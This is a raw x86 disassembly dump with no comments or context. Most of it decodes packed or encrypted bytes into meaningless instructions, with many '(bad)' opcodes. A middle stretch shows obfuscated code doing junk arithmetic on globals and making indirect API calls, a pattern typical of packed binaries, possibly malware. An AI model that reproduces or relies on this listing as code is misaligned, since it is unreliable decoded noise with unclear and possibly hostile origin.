  403368:	adc    BYTE PTR [ebx-0x5],ah
  40336b:	fcmovnu st,st(5)
  40336d:	push   ebp
  40336e:	push   ds
  40336f:	rcl    BYTE PTR [ebp+ebx*8+0xa2157d9],cl
  403376:	sbb    dh,BYTE PTR [esi+0x55]
  403379:	sub    eax,0xb5e3d8e
  40337e:	cdq    
  40337f:	mul    DWORD PTR [edi-0x72]
  403382:	mov    BYTE PTR ds:0x182e8c10,dh
  403388:	pop    ds
  403389:	xor    bh,BYTE PTR [edx]
  40338b:	or     al,0x6c
  40338d:	lock in eax,dx
  40338f:	test   DWORD PTR [edx+0x1706dadf],ecx
  403395:	int3   
  403396:	sbb    BYTE PTR [eax-0x3b],0xc4
  40339a:	xor    BYTE PTR [edx],dh
  40339c:	mov    edx,0xc373cc8d
  4033a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033a2:	pushf  
  4033a3:	xchg   ebx,eax
  4033a4:	enter  0xa8dc,0x43
  4033a8:	cmp    bl,BYTE PTR [ebx+0x2d]
  4033ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ac:	cdq    
  4033ad:	push   cs
  4033ae:	aaa    
  4033af:	jl     0x40336a
  4033b1:	add    DWORD PTR ds:0x23b32e08,eax
  4033b7:	imul   edi,DWORD PTR [ebx+0x285aff96],0x67fb1309
  4033c1:	cwde   
  4033c2:	jge    0x4033c0
  4033c4:	ins    BYTE PTR es:[edi],dx
  4033c5:	aad    0xc7
  4033c7:	jecxz  0x403420
  4033c9:	sub    al,0x16
  4033cb:	sbb    bh,BYTE PTR [esi-0x6]
  4033ce:	(bad)  
  4033cf:	adc    DWORD PTR [edi+0x162b4511],esp
  4033d5:	push   edx
  4033d6:	scas   al,BYTE PTR es:[edi]
  4033d7:	mov    ecx,0x2c9bc49b
  4033dc:	jns    0x403387
  4033de:	fwait
  4033df:	mov    DWORD PTR [eax-0x33],ebp
  4033e2:	in     al,0x3c
  4033e4:	leave  
  4033e5:	ud0    edi,DWORD PTR [ebx-0x43]
  4033e9:	retf   0x3f2c
  4033ec:	int    0x7b
  4033ee:	out    dx,al
  4033ef:	cmc    
  4033f0:	sub    bl,BYTE PTR [edi+0x0]
  4033f3:	jnp    0x403421
  4033f5:	in     eax,0x31
  4033f7:	adc    al,BYTE PTR [edi]
  4033f9:	leave  
  4033fa:	cli    
  4033fb:	jge    0x4033a4
  4033fd:	in     al,dx
  4033fe:	sub    BYTE PTR [bp+di],ch
  403401:	scas   eax,DWORD PTR es:[edi]
  403402:	dec    ecx
  403403:	inc    ecx
  403404:	xchg   esi,eax
  403405:	je     0x40343e
  403407:	mov    edx,0xd56f7e2c
  40340c:	or     dh,bl
  40340e:	xchg   edx,eax
  40340f:	rcl    ebp,0x53
  403412:	scas   eax,DWORD PTR es:[edi]
  403413:	xor    ebx,DWORD PTR [ebx]
  403415:	xchg   ecx,eax
  403416:	and    BYTE PTR [ebx+0x19a15f18],cl
  40341c:	retf   
  40341d:	adc    DWORD PTR [eax-0x4c],ebp
  403420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403421:	cmp    esi,DWORD PTR [ecx]
  403423:	aam    0x53
  403425:	xchg   ebx,eax
  403426:	mov    ch,0x88
  403428:	daa    
  403429:	mov    dl,0x52
  40342b:	stos   DWORD PTR es:[edi],eax
  40342c:	inc    edi
  40342d:	fild   WORD PTR [esi-0x1b]
  403430:	cs sbb esp,ebx
  403433:	push   ds
  403434:	fistp  QWORD PTR [edi+eiz*4-0x4ef8d69e]
  40343b:	mov    bl,BYTE PTR [ebp+0x1]
  40343e:	push   es
  40343f:	jl     0x4034a8
  403441:	and    al,0x46
  403443:	xchg   ecx,eax
  403444:	xchg   edi,eax
  403445:	adc    al,BYTE PTR [eax-0x1b4a03d5]
  40344b:	lods   al,BYTE PTR ds:[esi]
  40344c:	les    esi,FWORD PTR [edi-0x2d90e639]
  403452:	push   esi
  403453:	push   eax
  403454:	mov    dl,0x4d
  403456:	xchg   DWORD PTR [ebx+edi*8+0x77d9b539],ecx
  40345d:	and    cl,bh
  40345f:	push   ecx
  403460:	inc    esp
  403461:	std    
  403462:	mov    DWORD PTR [esi],esi
  403464:	cmp    eax,0x72b47cae
  403469:	inc    edx
  40346a:	sbb    eax,0xffcca51b
  40346f:	test   DWORD PTR [ecx-0x234f8c9b],0x433903cb
  403479:	or     ebx,ebp
  40347b:	test   DWORD PTR [ecx+eax*2],0xbe1280c0
  403482:	nop
  403483:	xchg   esi,eax
  403484:	push   0xfcaefede
  403489:	icebp  
  40348a:	ret    
  40348b:	sar    DWORD PTR [edx-0x79ea6fc4],0xf5
  403492:	pop    edx
  403493:	ret    
  403494:	gs add al,0x63
  403497:	jb     0x40349a
  403499:	lea    edx,[edx]
  40349b:	cmp    ah,dl
  40349d:	icebp  
  40349e:	aam    0x28
  4034a0:	push   0xe
  4034a2:	clc    
  4034a3:	push   edi
  4034a4:	sub    cl,BYTE PTR [ecx]
  4034a6:	pop    eax
  4034a7:	xchg   edx,eax
  4034a8:	cld    
  4034a9:	mov    WORD PTR [ebx-0x15],ss
  4034ac:	sbb    ch,al
  4034ae:	aam    0xd2
  4034b0:	cld    
  4034b1:	adc    edx,DWORD PTR [esi-0x1d]
  4034b4:	(bad)  
  4034b6:	into   
  4034b7:	leave  
  4034b8:	xor    dh,BYTE PTR [eax]
  4034ba:	sub    BYTE PTR [ebx],al
  4034bc:	sahf   
  4034bd:	fwait
  4034be:	mov    cl,BYTE PTR ds:0xcebe25b8
  4034c4:	fdiv   st(4),st
  4034c6:	sbb    DWORD PTR [esi-0x33],ecx
  4034c9:	adc    al,ah
  4034cb:	push   0xde40d471
  4034d0:	mov    esi,0xeed01456
  4034d5:	push   edi
  4034d6:	repnz test al,0xf7
  4034d9:	(bad)  
  4034da:	ret    0xa35c
  4034dd:	mov    dh,0x6d
  4034df:	mov    ebp,0x3221fe06
  4034e4:	add    dh,ch
  4034e6:	or     BYTE PTR [edx+0x53ee76b0],cl
  4034ec:	sbb    cl,BYTE PTR [ebx+0x13bec4d]
  4034f2:	mov    DWORD PTR ds:0x428153,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x6d],ch
  403514:	dec    bx
  403516:	jle    0x4034db
  403518:	in     eax,0x18
  40351a:	sbb    BYTE PTR [esi+0x2e181812],bl
  403520:	and    ah,dh
  403522:	imul   eax
  403524:	ss jae 0x403597
  403527:	daa    
  403528:	add    dl,BYTE PTR [eax-0x675d2e83]
  40352e:	jmp    0xa6b5a420
  403533:	dec    eax
  403534:	push   ds
  403535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403536:	dec    edx
  403537:	es in  eax,0xf
  40353a:	sub    bh,BYTE PTR [edx+0x62]
  40353d:	fwait
  40353e:	inc    ebp
  40353f:	and    eax,ecx
  403541:	dec    esp
  403542:	xor    ah,0x99
  403545:	(bad)  
  403546:	ins    BYTE PTR es:[edi],dx
  403547:	inc    ebp
  403548:	or     eax,0xe69190b2
  40354d:	xor    edi,0xa0be3136
  403553:	ret    0xee6a
  403556:	ins    BYTE PTR es:[edi],dx
  403557:	sub    DWORD PTR [edx+edx*2+0x32],ebx
  40355b:	sub    al,0xfd
  40355d:	xor    BYTE PTR [ebx+0x45],al
  403560:	std    
  403561:	(bad)  
  403562:	jmp    0x7a28617b
  403567:	xor    ch,bl
  403569:	sbb    dl,BYTE PTR [esi+0x343b7be9]
  40356f:	pop    ecx
  403570:	xchg   ebx,eax
  403571:	in     eax,0xe5
  403573:	mov    ds,WORD PTR [ebp*4-0x134130e9]
  40357a:	dec    ebp
  40357b:	call   0xa283ff44
  403580:	jp     0x403504
  403582:	sub    al,0x95
  403584:	scas   eax,DWORD PTR es:[edi]
  403585:	mov    cl,0x8a
  403587:	jmp    0xc378f488
  40358c:	ret    
  40358d:	dec    esp
  40358e:	(bad)  
  40358f:	mov    ebp,0x8dd471db
  403594:	aad    0x52
  403596:	dec    esi
  403597:	popa   
  403598:	in     eax,dx
  403599:	adc    al,0xf6
  40359b:	xlat   BYTE PTR ds:[ebx]
  40359c:	xor    DWORD PTR [eax+0x60],0x3652e83a
  4035a3:	das    
  4035a4:	xchg   BYTE PTR ds:0x496c167d,bh
  4035aa:	inc    edx
  4035ab:	das    
  4035ac:	popa   
  4035ad:	scas   al,BYTE PTR es:[edi]
  4035ae:	sub    eax,0x29ec83f
  4035b3:	jbe    0x4035a3
  4035b5:	jmp    0x4035dd
  4035b7:	xor    al,0x4a
  4035b9:	push   ds
  4035ba:	inc    esp
  4035bb:	sti    
  4035bc:	sti    
  4035bd:	stos   DWORD PTR es:[edi],eax
  4035be:	inc    edi
  4035bf:	ins    BYTE PTR es:[edi],dx
  4035c0:	lds    ebx,FWORD PTR [ecx-0x17]
  4035c3:	mov    esi,0x4cb19a1c
  4035c8:	jbe    0x403648
  4035ca:	jno    0x403591
  4035cc:	dec    ax
  4035ce:	adc    bh,bl
  4035d0:	pop    esp
  4035d1:	retf   
  4035d2:	int3   
  4035d3:	mov    WORD PTR [edx+edx*8-0x2cae09ed],ss
  4035da:	sub    al,0x7a
  4035dc:	or     BYTE PTR ds:0x73259e8c,al
  4035e2:	aas    
  4035e3:	mov    edx,0x254cadfb
  4035e8:	cmp    eax,0x3a904f88
  4035ed:	pop    ss
  4035ee:	inc    ecx
  4035ef:	jg     0x4035db
  4035f1:	or     eax,0x36ded5b5
  4035f6:	cld    
  4035f7:	xchg   ebp,eax
  4035f8:	pop    ebx
  4035f9:	mov    ah,0xe1
  4035fb:	shl    BYTE PTR [edx+0x4fdce8f0],1
  403601:	lahf   
  403602:	push   ss
  403603:	fld    QWORD PTR [edi+0x51]
  403606:	call   0xd45a6e54
  40360b:	xchg   esp,eax
  40360c:	ins    DWORD PTR es:[edi],dx
  40360d:	mov    edx,0x1c281d6a
  403612:	or     bh,al
  403614:	pop    edi
  403615:	inc    ebx
  403616:	jnp    0x403677
  403618:	test   al,0x2d
  40361a:	pop    ecx
  40361b:	aad    0xdb
  40361d:	cld    
  40361e:	mov    esi,0x380afd9c
  403623:	pop    es
  403624:	mov    dh,0xd5
  403626:	ds aad 0x2b
  403629:	lds    esi,FWORD PTR [edi-0x4adc4941]
  40362f:	cli    
  403630:	repnz mov eax,0x378f614e
  403636:	mov    dl,0xc6
  403638:	pusha  
  403639:	and    ch,BYTE PTR [edi-0x33]
  40363c:	mov    ebp,DWORD PTR ds:0xf2c130dd
  403642:	cmc    
  403643:	pop    edx
  403644:	js     0x403654
  403646:	not    dh
  403648:	xchg   ebx,eax
  403649:	sub    ecx,ebx
  40364b:	pop    edi
  40364c:	fstp   DWORD PTR [eax-0x70]
  40364f:	call   0xb0661e1
  403654:	adc    bl,BYTE PTR [ebx]
  403656:	sub    al,0x1
  403658:	mov    ecx,0x78201005
  40365d:	xor    eax,esp
  40365f:	mov    ebx,0x26e4adad
  403664:	dec    ebp
  403665:	cwde   
  403666:	ins    BYTE PTR es:[edi],dx
  403667:	cld    
  403668:	lock clc 
  40366a:	adc    al,0x56
  40366c:	xor    eax,0x7ef23e03
  403671:	mov    WORD PTR [edx],ds
  403673:	cmp    BYTE PTR [esi+0x402e949b],al
  403679:	scas   al,BYTE PTR es:[edi]
  40367a:	js     0x403644
  40367c:	(bad)  [ebp-0x6b]
  40367f:	and    al,0x7
  403681:	cwde   
  403682:	fiadd  WORD PTR [ebp+edi*2+0x7f]
  403686:	stos   DWORD PTR es:[edi],eax
  403687:	hlt    
  403688:	mov    dl,dl
  40368a:	cwde   
  40368b:	adc    ecx,eax
  40368d:	adc    dl,bh
  40368f:	iret   
  403690:	in     eax,0xa6
  403692:	mov    bh,BYTE PTR [ecx]
  403694:	xor    bh,BYTE PTR [ebx]
  403696:	add    BYTE PTR [ebp-0x61dc41ea],al
  40369c:	mov    esp,0xfd298015
  4036a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036a2:	sti    
  4036a3:	inc    esi
  4036a4:	and    BYTE PTR [edi],bh
  4036a6:	rol    bl,1
  4036a8:	sbb    esp,esi
  4036aa:	xor    dl,BYTE PTR [edi+ebx*2]
  4036ad:	xchg   ebp,eax
  4036ae:	push   0xffffff9d
  4036b0:	retf   0xd1b3
  4036b3:	mov    ?,ecx
  4036b5:	fcmovnbe st,st(2)
  4036b7:	iret   
  4036b8:	clc    
  4036b9:	push   esp
  4036ba:	neg    BYTE PTR [esi-0x3]
  4036bd:	(bad)  
  4036be:	fst    DWORD PTR [esp+esi*4]
  4036c1:	(bad)  
  4036c2:	out    dx,al
  4036c3:	mov    WORD PTR [eax],?
  4036c5:	pop    eax
  4036c6:	inc    ecx
  4036c7:	dec    esp
  4036c8:	inc    eax
  4036c9:	jns    0x40365f
  4036cb:	inc    eax
  4036cc:	pop    ss
  4036cd:	push   eax
  4036ce:	mov    ecx,0xc1891af8
  4036d3:	rol    esp,cl
  4036d5:	je     0x40370b
  4036d7:	daa    
  4036d8:	sahf   
  4036d9:	pop    ebx
  4036da:	out    0xc,al
  4036dc:	je     0x40368a
  4036de:	adc    al,al
  4036e0:	aas    
  4036e1:	fmul   QWORD PTR [edi-0x2d48a346]
  4036e7:	mov    WORD PTR [ecx-0x6bb9d3e5],cs
  4036ed:	in     al,0x84
  4036ef:	cmp    DWORD PTR [ebx-0x74],edx
  4036f2:	and    DWORD PTR [ebp+0x21818425],ebp
  4036f8:	pop    ecx
  4036f9:	jmp    0xb71c:0xc73d4e34
  403700:	sbb    ah,ch
  403702:	ds std 
  403704:	cmp    ebx,DWORD PTR [ecx-0x241f1520]
  40370a:	sahf   
  40370b:	or     al,0x52
  40370d:	in     eax,0xe2
  40370f:	push   cs
  403710:	xor    bl,dh
  403712:	jo     0x4036d1
  403714:	ds push esi
  403716:	aam    0x38
  403718:	sub    edx,esp
  40371a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40371b:	dec    ebp
  40371c:	loope  0x4036cf
  40371e:	lods   eax,DWORD PTR ds:[esi]
  40371f:	mov    DWORD PTR [ebp-0x66],eax
  403722:	in     al,dx
  403723:	push   edi
  403724:	xchg   esi,eax
  403725:	sub    esp,DWORD PTR [ebp-0x34e5946a]
  40372b:	loopne 0x4036f6
  40372d:	scas   al,BYTE PTR es:[edi]
  40372e:	mov    edx,0xe9d25fc
  403733:	jmp    0x403706
  403735:	dec    esi
  403736:	mov    al,0x7c
  403738:	xchg   esp,eax
  403739:	cmp    al,0x12
  40373b:	inc    edi
  40373c:	hlt    
  40373d:	imul   ebx,DWORD PTR [edx-0x2b63f0d8],0xffffffdb
  403744:	leave  
  403745:	sub    dl,cl
  403747:	mov    esi,0x3dcbbbfe
  40374c:	rol    DWORD PTR [esi-0x4dfe8424],1
  403752:	inc    ebp
  403753:	in     eax,0x87
  403755:	nop
  403756:	(bad)  
  403757:	aam    0x15
  403759:	out    0xa3,al
  40375b:	out    0x3b,al
  40375d:	mov    al,0xdd
  40375f:	out    0x4d,eax
  403761:	iret   
  403762:	mov    eax,ds:0xd6be386
  403767:	pop    ss
  403768:	jge    0x4036f0
  40376a:	aaa    
  40376b:	stos   DWORD PTR es:[edi],eax
  40376c:	add    bh,ch
  40376e:	xor    cl,ah
  403770:	iret   
  403771:	das    
  403772:	adc    al,0x60
  403774:	jmp    0x40375e
  403776:	sti    
  403777:	push   edx
  403778:	sbb    edi,DWORD PTR [ecx+0x742a4aed]
  40377e:	es cmp al,0xc
  403781:	jle    0x403766
  403783:	push   esp
  403784:	push   cs
  403785:	repz int 0x45
  403788:	or     ebx,esp
  40378a:	cmp    BYTE PTR [ebx+0x4b],dh
  40378d:	scas   eax,DWORD PTR es:[edi]
  40378e:	push   ebx
  40378f:	frstor [ecx+0x78]
  403792:	lods   al,BYTE PTR ds:[esi]
  403793:	idiv   BYTE PTR [ecx+ebp*2+0x10aa6d7b]
  40379a:	add    ecx,DWORD PTR [edx]
  40379c:	imul   esp,ecx,0xa68ac499
  4037a2:	push   es
  4037a3:	xchg   esi,eax
  4037a4:	bound  esi,QWORD PTR [eax+0x77]
  4037a7:	sbb    edx,DWORD PTR [edi]
  4037a9:	addr16 retf 0xf629
  4037ad:	(bad)  
  4037ae:	out    dx,al
  4037af:	jae    0x4037cc
  4037b1:	jne    0x40379a
  4037b3:	inc    edi
  4037b4:	in     al,dx
  4037b5:	lea    esi,[edx-0x7a]
  4037b8:	mov    esi,0xadfe8c70
  4037bd:	(bad)  
  4037be:	fs or  eax,0x2d61eabf
  4037c4:	mov    bl,0x70
  4037c6:	fwait
  4037c7:	jecxz  0x403830
  4037c9:	out    0x7e,eax
  4037cb:	or     edx,DWORD PTR [edx-0x33efe694]
  4037d1:	jecxz  0x403775
  4037d3:	retf   
  4037d4:	dec    edi
  4037d5:	push   ebp
  4037d6:	mov    bh,0xb2
  4037d8:	imul   ebp,DWORD PTR [edx-0x5c496ce5],0x1a
  4037df:	ins    BYTE PTR es:[edi],dx
  4037e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e1:	xor    esi,DWORD PTR [eax-0x49ad7689]
  4037e7:	addr16 into 
  4037e9:	push   0x50f2b1
  4037ee:	add    DWORD PTR [edi+0x67],esi
  4037f1:	popf   
  4037f2:	int    0xc3
  4037f4:	pop    eax
  4037f5:	cwde   
  4037f6:	imul   BYTE PTR [edi-0x47aaffb]
  4037fc:	lods   eax,DWORD PTR ds:[esi]
  4037fd:	hlt    
  4037fe:	or     BYTE PTR [edx],0xeb
  403801:	pop    ebp
  403802:	sbb    dl,BYTE PTR [edx]
  403804:	ja     0x403825
  403806:	mov    ah,0x6d
  403808:	loopne 0x4037ea
  40380a:	mov    al,0x4f
  40380c:	sub    ah,BYTE PTR [ebx-0x2f]
  40380f:	push   0xffffffaf
  403811:	add    ebx,ecx
  403813:	sbb    BYTE PTR [edx+edx*1+0x7a],0x3f
  403818:	pop    edx
  403819:	jp     0x403837
  40381b:	sub    edi,DWORD PTR [ecx+0x36]
  40381e:	xchg   esi,eax
  40381f:	ror    BYTE PTR [ecx],cl
  403821:	lock into 
  403823:	mov    ebp,ss
  403825:	adc    eax,0x5645302f
  40382a:	mov    cl,0x50
  40382c:	xchg   esi,eax
  40382d:	jmp    0x4037e9
  40382f:	mov    esp,eax
  403831:	repnz stos BYTE PTR es:[edi],al
  403833:	repnz test eax,0x7e788a87
  403839:	dec    DWORD PTR [edi]
  40383b:	aam    0xe6
  40383d:	adc    DWORD PTR [esi+0x1c],edi
  403840:	cmp    DWORD PTR [edx+0xd],ebx
  403843:	dec    ecx
  403844:	push   ss
  403845:	push   ds
  403846:	scas   eax,DWORD PTR es:[edi]
  403847:	repnz sub edi,ebx
  40384a:	mov    eax,ds:0x4beb257
  40384f:	jg     0x403817
  403851:	in     al,dx
  403852:	leave  
  403853:	jl     0x40384d
  403855:	xchg   DWORD PTR [eax-0x7f6aa48e],ebx
  40385b:	push   cs
  40385c:	retf   
  40385d:	lahf   
  40385e:	in     eax,0x67
  403860:	fbld   TBYTE PTR [esi]
  403862:	aad    0x7e
  403864:	add    bl,BYTE PTR [edi-0x7312b7a1]
  40386a:	lds    esp,FWORD PTR [ecx+ebx*1+0x19ab9b06]
  403871:	cmp    BYTE PTR [edi-0x4f701bd5],0xe8
  403878:	jb     0x403800
  40387a:	rcr    DWORD PTR [ebx-0x14],0xfe
  40387e:	sbb    eax,0x9e44ab43
  403883:	or     al,0x53
  403885:	dec    edx
  403886:	and    BYTE PTR [esi],bl
  403888:	retf   0xcf50
  40388b:	cmp    al,0x81
  40388d:	adc    ah,cl
  40388f:	in     eax,0x3d
  403891:	iret   
  403892:	xchg   ebx,eax
  403893:	dec    esi
  403894:	xlat   BYTE PTR ds:[ebx]
  403895:	mov    cl,0x90
  403897:	outs   dx,BYTE PTR ds:[esi]
  403898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403899:	dec    ebx
  40389a:	inc    edi
  40389b:	dec    esi
  40389c:	stc    
  40389d:	sbb    eax,0x1a071115
  4038a2:	dec    esi
  4038a3:	dec    edx
  4038a4:	pop    ss
  4038a5:	fistp  DWORD PTR [ebx+edi*1+0x1b55c57f]
  4038ac:	in     eax,dx
  4038ad:	sti    
  4038ae:	mov    BYTE PTR [ebx+edi*4+0x5d],bh
  4038b2:	bound  edx,QWORD PTR [eax+0x2f]
  4038b5:	shr    ecx,0xc9
  4038b8:	jmp    0x38b1:0xc0ce1c84
  4038bf:	or     al,0x52
  4038c1:	push   es
  4038c2:	cdq    
  4038c3:	int    0x77
  4038c5:	mov    eax,ds:0x623dbf74
  4038ca:	add    esp,esp
  4038cc:	pop    ecx
  4038cd:	sbb    ch,ch
  4038cf:	lock call FWORD PTR [esi-0x70e4b43d]
  4038d6:	mov    al,0x8
  4038d8:	nop
  4038d9:	xor    BYTE PTR [edi+0x64532573],bl
  4038df:	mov    eax,DWORD PTR ss:[ebp-0xc]
  4038e3:	cmp    DWORD PTR ds:0x428253,0x0
  4038ea:	not    DWORD PTR ds:0x42814b
  4038f0:	mov    ecx,DWORD PTR ds:0x428277
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428253,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428ec8
  403913:	xor    edx,DWORD PTR ds:0x42823f
  403919:	neg    DWORD PTR ds:0x428253
  40391f:	xor    DWORD PTR ds:0x428147,0x12a5
  403929:	and    DWORD PTR ds:0x428397,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42827b
  403939:	or     ecx,DWORD PTR ds:0x42822f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428153,0x0
  403949:	mov    DWORD PTR ds:0x428397,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428153,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428d9c
  40397f:	adc    DWORD PTR ds:0x428287,0x42816f
  403989:	sbb    DWORD PTR ds:0x428273,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428373
  403999:	or     DWORD PTR ds:0x42824f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428277
  4039a7:	adc    edx,DWORD PTR ds:0x42825b
  4039ad:	mov    DWORD PTR ds:0x428277,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42822f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428297,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42828b,0x428397
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42816b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428147,0x42830f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428153,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42814b,0x4282e3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42825f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428277,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428147,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428273,0x0
  403a3e:	mov    DWORD PTR ds:0x4282ff,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428397
  403a57:	cmp    DWORD PTR ds:0x428273,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d78
  403a6f:	mov    edx,DWORD PTR ds:0x42832f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283c3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428173,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428167,0x2089
  403aa2:	or     DWORD PTR ds:0x42814b,0x113b
  403aac:	mov    eax,ds:0x4223c0
  403ab1:	cmp    DWORD PTR ds:0x428173,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42823f
  403ac3:	mov    DWORD PTR ds:0x428223,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428313,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428173,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428173,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428113
  403af8:	call   DWORD PTR ds:0x428da0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42823b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42827f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42836b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42815b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xbcd94f72
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0x58181812],bl
  403b4b:	push   es
  403b4c:	or     esp,ecx
  403b4e:	pop    ebp
  403b4f:	push   esp
  403b50:	sub    DWORD PTR [edi+0x1758809f],esi
  403b56:	dec    sp
  403b58:	loopne 0x403b70
  403b5a:	int    0x4
  403b5c:	ss and eax,0xbd7383fa
  403b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b64:	pop    esi
  403b65:	sbb    esp,DWORD PTR [eax-0x45]
  403b68:	jp     0x403b75
  403b6a:	sub    BYTE PTR [ecx+0x30364ce2],ah
  403b70:	jmp    0x611b:0x65d7ec99
  403b77:	push   edx
  403b78:	shl    BYTE PTR [edi-0x3b5c4b55],1
  403b7e:	cs xchg ecx,eax
  403b80:	cmp    al,0x8e
  403b82:	push   es
  403b83:	mov    esp,0x6cb01812
  403b88:	loop   0x403bf9
  403b8a:	adc    al,0x3d
  403b8c:	push   cx
  403b8e:	loop   0x403bae
  403b90:	xchg   edx,eax
  403b91:	add    DWORD PTR [ebx+0x5],esp
  403b94:	(bad)  
  403b95:	dec    esp
  403b96:	in     al,dx
  403b97:	ss xor eax,eax
  403b9a:	fs cdq 
  403b9c:	mov    ebp,0x797e81c4
  403ba1:	mov    BYTE PTR [eax],cl
  403ba3:	call   0x9a9bcb1d
  403ba8:	(bad)  
  403ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403baa:	jo     0x403b4b
  403bac:	aam    0xe5
  403bae:	icebp  
  403baf:	pop    edx
  403bb0:	cmp    eax,0xe1b08e34
  403bb5:	inc    ebx
  403bb6:	nop
  403bb7:	(bad)  
  403bb9:	xor    ecx,ebp
  403bbb:	out    0xb,eax
  403bbd:	xchg   ebp,eax
  403bbe:	aas    
  403bbf:	cs mov al,0xf1
  403bc2:	push   edx
  403bc3:	push   esi
  403bc4:	or     BYTE PTR [edx+ebp*2],bh
  403bc7:	adc    al,BYTE PTR [eax-0x1b2081c]
  403bcd:	jmp    0x403b7c
  403bcf:	es inc esi
  403bd1:	loopne 0x403c26
  403bd3:	inc    ebp
  403bd4:	(bad)  
  403bd5:	sti    
  403bd6:	pop    ecx
  403bd7:	lahf   
  403bd8:	js     0x403b79
  403bda:	sahf   
  403bdb:	or     bl,cl
  403bdd:	imul   ecx,ebp,0x7a
  403be0:	stos   DWORD PTR es:[edi],eax
  403be1:	sahf   
  403be2:	cli    
  403be3:	cmp    eax,0xf3ba8096
  403be8:	lahf   
  403be9:	fmul   st(1),st
  403beb:	lods   al,BYTE PTR ds:[esi]
  403bec:	pop    edi
  403bed:	add    BYTE PTR [ecx+0x3fa77a4a],ch
  403bf3:	outs   dx,BYTE PTR ds:[esi]
  403bf4:	inc    ebp
  403bf5:	cmp    DWORD PTR [esi],ebp
  403bf7:	stos   BYTE PTR es:[edi],al
  403bf8:	jb     0x403c34
  403bfa:	jno    0x403c54
  403bfc:	lahf   
  403bfd:	inc    ebp
  403bfe:	xchg   esp,eax
  403bff:	(bad)  
  403c00:	out    dx,eax
  403c01:	pusha  
  403c02:	push   esi
  403c03:	push   ecx
  403c04:	pop    edi
  403c05:	xchg   esi,eax
  403c06:	cs xor ecx,DWORD PTR cs:[ebx-0x59]
  403c0b:	xchg   edx,eax
  403c0c:	js     0x403c6d
  403c0e:	push   ebp
  403c0f:	jl     0x403c8a
  403c11:	xor    DWORD PTR [ebx],edx
